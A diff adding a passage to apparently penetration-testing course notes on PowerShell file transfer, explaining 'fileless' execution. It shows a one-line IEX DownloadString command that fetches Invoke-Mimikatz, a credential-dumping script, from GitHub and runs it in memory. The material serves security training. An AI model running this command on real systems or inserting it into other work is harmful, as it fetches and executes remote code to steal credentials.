@@ -90,3 +90,8 @@ PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubuserc
     - Can make long-running downloads less disruptive.
 
 #### PowerShell DownloadString - Fileless Method
+As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
+
+```powershell
+PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
